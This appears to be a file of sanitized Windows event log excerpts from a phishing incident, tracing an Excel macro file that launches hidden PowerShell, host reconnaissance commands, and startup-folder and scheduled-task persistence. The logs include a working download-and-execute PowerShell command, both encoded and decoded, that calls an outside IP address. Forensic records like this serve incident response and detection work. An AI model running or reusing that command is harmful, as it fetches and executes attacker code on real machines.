@@ -1,0 +1,180 @@
+# Windows Event Log Excerpts (Sanitized)
+
+This file contains sanitized excerpts from Windows Event Logs related to the incident.
+
+```
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          3/15/2023 9:31:24 AM
+Event ID:      4688
+Task Category: Process Creation
+Level:         Information
+Keywords:      Audit Success
+User:          N/A
+Computer:      WKSTN-FIN23.example.com
+Description:
+A new process has been created.
+
+Creator Subject:
+	Security ID:      EXAMPLE\finance.user
+	Account Name:     finance.user
+	Account Domain:   EXAMPLE
+	Logon ID:         0x1234567
+
+Process Information:
+	New Process ID:     0x1234
+	New Process Name:   C:\Program Files\Microsoft Office\Office16\EXCEL.EXE
+	Token Elevation Type: TokenElevationTypeLimited (3)
+	Creator Process ID: 0x5678
+	Creator Process Name: C:\Windows\Explorer.EXE
+	Process Command Line: "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE" "C:\Users\finance.user\Downloads\Invoice_March2023.xlsm"
+```
+
+```
+Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
+Date:          3/15/2023 9:32:15 AM
+Event ID:      4688
+Task Category: Process Creation
+Level:         Information
+Keywords:      Audit Success
+User:          N/A
+Computer:      WKSTN-FIN23.example.com
+Description:
+A new process has been created.
+
+Creator Subject:
+	Security ID:      EXAMPLE\finance.user
+	Account Name:     finance.user
+	Account Domain:   EXAMPLE
+	Logon ID:         0x1234567
+
+Process Information:
+	New Process ID:     0x2345
+	New Process Name:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type: TokenElevationTypeLimited (3)
+	Creator Process ID: 0x1234
+	Creator Process Name: C:\Program Files\Microsoft Office\Office16\EXCEL.EXE
+	Process Command Line: powershell.exe -nop -w hidden -e JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADMALgA0ADUALgAyADMAMQAuADEAOQA4AC8AaQBuAGQAZQB4AC4AcABoAHAAJwApAHwAaQBlAHgA
+```
+
+```
+Log Name:      Microsoft-Windows-PowerShell/Operational
+Source:        Microsoft-Windows-PowerShell
+Date:          3/15/2023 9:32:18 AM
+Event ID:      4104
+Task Category: Execute a Remote Command
+Level:         Warning
+Keywords:      
+User:          EXAMPLE\finance.user
+Computer:      WKSTN-FIN23.example.com
+Description:
+ScriptBlock Logging
+ScriptBlock ID: {b1d2e3f4-c5d6-e7f8-a9b0-c1d2e3f4a5b6}
+ScriptBlock Text:
+$c=new-object net.webclient;$c.downloadstring('http://103.45.231.198/index.php')|iex
+```
+
+```
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Source:        Microsoft-Windows-Sysmon
+Date:          3/15/2023 9:33:05 AM
+Event ID:      3
+Task Category: Network connection
+Level:         Information
+Keywords:      
+User:          EXAMPLE\finance.user
+Computer:      WKSTN-FIN23.example.com
+Description:
+Network connection detected:
+RuleName: technique_id=T1071.001,technique_name=Application Layer Protocol: Web Protocols
+UtcTime: 2023-03-15 09:33:05.123
+ProcessGuid: {a1b2c3d4-e5f6-7890-a1b2-c3d4e5f67890}
+ProcessId: 2345
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: EXAMPLE\finance.user
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 10.1.2.3
+SourceHostname: WKSTN-FIN23.example.com
+SourcePort: 49152
+SourcePortName: 
+DestinationIsIpv6: false
+DestinationIp: 103.45.231.198
+DestinationHostname: 
+DestinationPort: 80
+DestinationPortName: http
+```
+
+```
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Source:        Microsoft-Windows-Sysmon
+Date:          3/15/2023 9:33:45 AM
+Event ID:      1
+Task Category: Process creation
+Level:         Information
+Keywords:      
+User:          EXAMPLE\finance.user
+Computer:      WKSTN-FIN23.example.com
+Description:
+Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2023-03-15 09:33:45.456
+ProcessGuid: {b2c3d4e5-f6a7-8901-b2c3-d4e5f6a78901}
+ProcessId: 3456
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: cmd.exe /c whoami & net user & ipconfig /all & systeminfo
+CurrentDirectory: C:\Users\finance.user\AppData\Local\Temp\
+User: EXAMPLE\finance.user
+LogonGuid: {c3d4e5f6-a7b8-9012-c3d4-e5f6a7b89012}
+LogonId: 0x1234567
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: SHA1=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B,MD5=A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6
+ParentProcessGuid: {d4e5f6a7-b8c9-0123-d4e5-f6a7b8c90123}
+ParentProcessId: 2345
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -nop -w hidden -e JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADMALgA0ADUALgAyADMAMQAuADEAOQA4AC8AaQBuAGQAZQB4AC4AcABoAHAAJwApAHwAaQBlAHgA
+```
+
+```
+Log Name:      Microsoft-Windows-Sysmon/Operational
+Source:        Microsoft-Windows-Sysmon
+Date:          3/15/2023 9:34:12 AM
+Event ID:      11
+Task Category: File created
+Level:         Information
+Keywords:      
+User:          EXAMPLE\finance.user
+Computer:      WKSTN-FIN23.example.com
+Description:
+File created:
+RuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Startup Folder
+UtcTime: 2023-03-15 09:34:12.789
+ProcessGuid: {d4e5f6a7-b8c9-0123-d4e5-f6a7b8c90123}
+ProcessId: 2345
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\finance.user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.lnk
+CreationUtcTime: 2023-03-15 09:34:12.789
+User: EXAMPLE\finance.user
+```
+
+```
+Log Name:      Microsoft-Windows-TaskScheduler/Operational
+Source:        Microsoft-Windows-TaskScheduler
+Date:          3/15/2023 9:35:30 AM
+Event ID:      106
+Task Category: Task registered
+Level:         Information
+Keywords:      
+User:          EXAMPLE\finance.user
+Computer:      WKSTN-FIN23.example.com
+Description:
+User "EXAMPLE\finance.user" registered Task Scheduler task "\Microsoft\Windows\SystemUpdate"
+```
